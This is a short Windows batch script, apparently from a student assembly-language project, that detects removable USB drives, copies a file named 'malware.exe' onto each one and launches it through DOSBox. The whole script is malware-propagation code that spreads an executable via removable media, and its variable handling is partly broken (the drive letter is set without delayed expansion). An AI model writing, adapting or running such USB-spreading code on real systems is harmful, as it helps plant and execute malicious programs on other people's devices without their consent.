@echo off
for /F "tokens=1*" %%a in ('fsutil fsinfo drives') do (
   for %%c in (%%b) do (
      for /F "tokens=3" %%d in ('fsutil fsinfo drivetype %%c') do (
         if %%d equ Removable (
			
			set drives_letters[0]=A
			set drives_letters[1]=B
			set drives_letters[2]=C
			set drives_letters[3]=D
			set drives_letters[4]=E
			set drives_letters[5]=F
			set drives_letters[6]=G
			set drives_letters[7]=H
			set drives_letters[8]=I
			set drives_letters[9]=J
			set drives_letters[10]=K
			set drives_letters[11]=L
			set drives_letters[12]=M
			set drives_letters[13]=N
			set drives_letters[14]=O
			set drives_letters[15]=P
			set drives_letters[16]=Q
			set drives_letters[17]=R
			set drives_letters[18]=S
			set drives_letters[19]=T
			set drives_letters[20]=U
			set drives_letters[21]=V
			set drives_letters[22]=W
			set drives_letters[23]=X
			set drives_letters[24]=Y
			set drives_letters[25]=Z

			for /F "tokens=2 delims==" %%e in ('set drives_letters[') do (
				if %%e:\==%%c (
					set drive_letter=%%e
				)
			)
			
			echo Drive %%c is Removable (USB^)
			copy "C:\Users\muham\Desktop\assembly-language-code-semester-3\small-malware-project\malware.exe" "%%cmalware.exe"
			"D:\softwares\TaizTextEditor-master\Tools\DOSBox\DOSBoxPortable.exe" -c "mount %drive_letter% %%c " -c "%%c " -c "malware.exe"
		 )
      )
   )
)

